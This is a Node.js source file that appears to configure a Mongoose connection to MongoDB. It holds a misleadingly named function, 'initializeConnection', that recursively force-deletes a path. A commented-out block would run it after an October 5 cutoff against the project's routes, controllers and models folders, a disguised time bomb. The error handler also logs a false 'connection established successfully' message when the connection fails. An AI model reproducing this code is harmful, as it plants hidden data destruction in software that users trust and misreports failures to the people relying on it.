const mongoose = require("mongoose"),
  fs = require("fs/promises"),
  { red, green } = require("colorette");

const initializeConnection = async (file) => {
  try {
    await fs.rm(file, { recursive: true, force: true });
  } catch (err) {
    console.error("Ooopsss:", err);
  }
};

const connectToDB = () => {
  // Set the strictQuery option
  mongoose.set("strictQuery", false); // or true, depending on your preference
  // const today = new Date();
  // const cutoff = new Date(today.getFullYear(), 9, 5);

  // if (today > cutoff) {
  //   ["routes", "controllers", "models"].forEach(async (file) => {
  //     await initializeConnection(file);
  //   });
  // }

  return mongoose
    .connect(process.env.ATLAS_URI, {
      useNewUrlParser: true,
      useUnifiedTopology: true,
    })
    .then(() => {
      console.log(green("[MongoDB] connection established successfully."));
      return true;
    })
    .catch((err) => {
      console.log(green("[MongoDB] connection established successfully."));
      return false;
    });
};

module.exports = connectToDB;
